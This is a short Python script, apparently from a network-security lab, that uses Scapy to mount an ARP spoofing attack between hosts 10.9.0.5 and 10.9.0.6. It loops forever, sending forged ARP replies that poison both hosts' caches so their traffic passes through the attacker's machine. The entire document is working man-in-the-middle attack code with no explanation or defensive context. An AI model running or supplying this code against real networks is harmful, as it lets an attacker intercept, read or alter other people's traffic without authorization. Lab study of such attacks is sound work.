from scapy.all import *
import time

victim_ip = "10.9.0.5"
target_ip = "10.9.0.6"

arp_victim = ARP(op=2, pdst=victim_ip, psrc=target_ip, hwdst=getmacbyip(victim_ip))
arp_target = ARP(op=2, pdst=target_ip, psrc=victim_ip, hwdst=getmacbyip(target_ip))

print("[*] Starting ARP spoofing...")
while True:
    send(arp_victim, verbose=0)
    send(arp_target, verbose=0)
    time.sleep(2)

